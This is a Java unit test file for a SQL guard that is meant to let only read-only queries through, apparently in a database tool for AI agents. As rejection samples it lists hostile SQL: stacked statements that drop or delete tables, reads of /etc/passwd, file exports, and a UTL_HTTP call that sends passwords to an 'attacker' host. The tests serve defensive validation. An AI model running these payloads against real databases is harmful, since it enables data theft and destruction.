package io.github.thescarletarrow.dbmcp.sql;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class SqlGuardTest {

    @ParameterizedTest
    @ValueSource(strings = {
            "SELECT * FROM users;",
            "  select 'drop table x' as note from dual",
            "WITH t AS (SELECT 1) SELECT * FROM t",
            "-- delete everything\nSELECT count(*) FROM orders /* update */",
            "EXPLAIN ANALYZE SELECT 1",
            "SELECT \"update\", created_at FROM audit",
            "SELECT \"into\" FROM audit",
            "select * from t where name = 'it''s; fine'",
            "SELECT $$it's; a literal, not a batch$$ AS note",
            "SELECT $tag$ ; $tag$ AS note FROM t",
            "SELECT q'{it's fine; really}' FROM dual",
            "SELECT sid, program FROM v$session WHERE status = 'ACTIVE'",
            "SELECT id FROM orders ORDER BY id DESC FETCH FIRST 10 ROWS ONLY"
    })
    void acceptsReadStatements(String sql) {
        assertThat(SqlGuard.requireReadOnly(sql)).doesNotEndWith(";");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "DELETE FROM users",
            "update users set a = 1",
            "SELECT 1; DROP TABLE users",
            "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d",
            "SELECT * FROM t FOR UPDATE",
            "select pg_sleep(1); commit",
            "CREATE TABLE t (id int)",
            "begin dbms_output.put_line('x'); end",
            "",
            "-- only a comment"
    })
    void rejectsNonReadStatements(String sql) {
        assertThatThrownBy(() -> SqlGuard.requireReadOnly(sql)).isInstanceOf(IllegalArgumentException.class);
    }

    /** {@code SELECT ... INTO} creates or fills a table while looking exactly like a query. */
    @ParameterizedTest
    @ValueSource(strings = {
            "SELECT * INTO backup FROM users",
            "select id, name into new_users from users where id > 10",
            "WITH t AS (SELECT 1 AS id) SELECT id INTO copy FROM t",
            "SELECT * FROM users INTO OUTFILE '/tmp/users.csv'"
    })
    void rejectsSelectInto(String sql) {
        assertThatThrownBy(() -> SqlGuard.requireReadOnly(sql))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("INTO");
    }

    /** Routines that write, touch the file system or run SQL handed to them as text. */
    @ParameterizedTest
    @ValueSource(strings = {
            "SELECT nextval('orders_id_seq')",
            "SELECT setval('orders_id_seq', 1)",
            "SELECT lo_export(16384, '/tmp/leak')",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT pg_terminate_backend(pid) FROM pg_stat_activity",
            "SELECT dblink_exec('dbname=orders', 'DELETE FROM users')",
            "SELECT query_to_xml('DELETE FROM users', true, true, '')",
            "SELECT CSVWRITE('/tmp/leak.csv', 'SELECT * FROM users')",
            "SELECT DBMS_XMLGEN.getxml('DELETE FROM users') FROM dual",
            "SELECT UTL_HTTP.request('http://attacker/' || password) FROM users",
            "SELECT DBMS_LOB.getlength(payload) FROM documents"
    })
    void rejectsRoutinesThatWriteOrReachOutside(String sql) {
        assertThatThrownBy(() -> SqlGuard.requireReadOnly(sql)).isInstanceOf(IllegalArgumentException.class);
    }

    /** Lexer tricks that used to hide a second statement from a naive keyword scan. */
    @ParameterizedTest
    @ValueSource(strings = {
            "SELECT 1 /* comment */ ; DELETE FROM users",
            "SELECT 1 -- comment\n; DELETE FROM users",
            "SELECT 'a\\' ; DELETE FROM users -- '",
            "SELECT $$x$$; DELETE FROM users",
            "SELECT 'unterminated ; DELETE FROM users",
            "SELECT 1 /* unterminated ; DELETE FROM users",
            "SELECT $$unterminated ; DELETE FROM users",
            "SELECT q'{unterminated ; DELETE FROM users"
    })
    void rejectsStatementsHiddenInLiteralsAndComments(String sql) {
        assertThatThrownBy(() -> SqlGuard.requireReadOnly(sql)).isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void stripsTrailingSemicolonsAndComments() {
        assertThat(SqlGuard.requireReadOnly("-- header\nSELECT 1 ; -- done\n")).isEqualTo("SELECT 1");
        assertThat(SqlGuard.requireReadOnly("SELECT /*+ INDEX(t idx) */ id FROM t;")).isEqualTo("SELECT /*+ INDEX(t idx) */ id FROM t");
    }

    @ParameterizedTest
    @ValueSource(strings = {"INSERT INTO t VALUES (1);", "CREATE TABLE t (id int)", "UPDATE t SET a = ';'"})
    void singleStatementAllowsWrites(String sql) {
        assertThat(SqlGuard.requireSingleStatement(sql)).isNotBlank();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "INSERT INTO t VALUES (1); DELETE FROM t",
            "  ",
            "/* x */",
            "INSERT INTO t VALUES ('unterminated)",
            "UPDATE t SET a = 'x\\' ; DROP TABLE t --'"
    })
    void singleStatementRejectsBatchesAndEmpty(String sql) {
        assertThatThrownBy(() -> SqlGuard.requireSingleStatement(sql)).isInstanceOf(IllegalArgumentException.class);
    }
}
